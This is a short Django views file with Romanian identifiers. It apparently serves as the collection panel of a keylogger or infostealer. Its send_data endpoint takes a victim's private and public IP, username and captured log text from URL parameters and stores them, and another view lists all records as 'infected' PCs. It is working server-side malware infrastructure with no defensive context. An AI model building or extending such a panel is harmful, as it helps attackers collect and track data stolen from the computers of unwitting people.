from django.shortcuts import render,redirect
from .models import Date
import urllib.parse as urlparse
from urllib.parse import parse_qs
# Create your views here.

def send_data(request):
    print(request)

    dictionar_data=request.GET
    info = dictionar_data.getlist('info')

    string_mesaj=''
    for letter in info:
        string_mesaj+=letter
    print(string_mesaj)
    new_obj = Date(ip_privat=dictionar_data.get('ip_privat'), user=dictionar_data.get('nume_utilizator'),
                   ip_public=dictionar_data.get('ip_public'), loguri=string_mesaj)
    new_obj.save(force_insert=True)
    return render(request,"send_data.html",context={"data":dictionar_data})


def homepage(request):
    return render(request,'homepage.html')

def detailedview(request):
    id=request.GET['id']
    specific_obj=Date.objects.get(id=id)
    print(specific_obj)
    return render(request,'detailedview.html',context={'date':specific_obj})

def infected(request):
    all_data=Date.objects.all
    context={
        'all':all_data
    }
    return render(request, 'infectedPCS.html',context)